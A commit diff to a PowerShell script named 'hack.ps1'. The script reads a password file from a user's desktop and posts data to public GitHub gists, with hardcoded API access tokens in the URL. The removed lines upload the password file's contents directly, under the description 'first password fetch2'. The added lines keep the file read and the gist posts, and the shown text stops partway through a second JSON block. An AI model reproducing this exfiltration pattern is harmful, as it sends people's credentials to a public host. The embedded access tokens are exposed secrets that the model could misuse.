d011f567b37a0e2014963b1b2a7da5d75a041bec
2arcz6 <2arcz6@gmail.com>
2019-12-20 02:47:08 +0800

    updated token

--- hack.ps1
+++ hack.ps1
@@ -1,26 +1,34 @@
 $URL = "https://api.github.com"
 $Endpoint = "/gists"
+
+
 $password = Get-Content C:\Users\ASUS\Desktop\pass.txt
 
-# $URLAnon = "$URL$Endpoint"
-# $JSON = ConvertTo-Json @{
-#           description = "test fetch";
-#           public =  $true;
-#           files = @{
-#             "file1.txt" = @{
-#               content = $password
-#             }
-#           }
-#         }
-# $gist = Invoke-RestMethod -Method Post -Uri $URLAnon -Body $JSON
+$URLAnon = "$URL$Endpoint"
 
-$Token = "?access_token=2b3aef14ba9be99c3688f204a40d4d75ee3a3bf2"
+
+$JSON = ConvertTo-Json @{
+          description = "the descriptiodsadasdn for this gist";
+          public =  $true;
+          files = @{
+            "file1.txt" = @{
+              content = "String file condasdasdastents"
+            }
+          }
+        }
+
+
+$gist = Invoke-RestMethod -Method Post -Uri $URLAnon -Body $JSON
+
+$Token = "?access_token=dee2d7912c743c6a34d336d0bc49faa87727927d"
 $URLSecure = "$URL$Endpoint$Token"
+
 $gist = Invoke-RestMethod -Method Post -Uri $URLSecure -Body $JSON
+
 $URLEdit = "$URL$Endpoint/$($gist.id)$Token"
 
 $JSON2 = ConvertTo-Json @{
-          description = "first password fetch2";
+          description = "Potadasdasto";
           public =  $true;
           files = @{
             "file1.txt" = @{
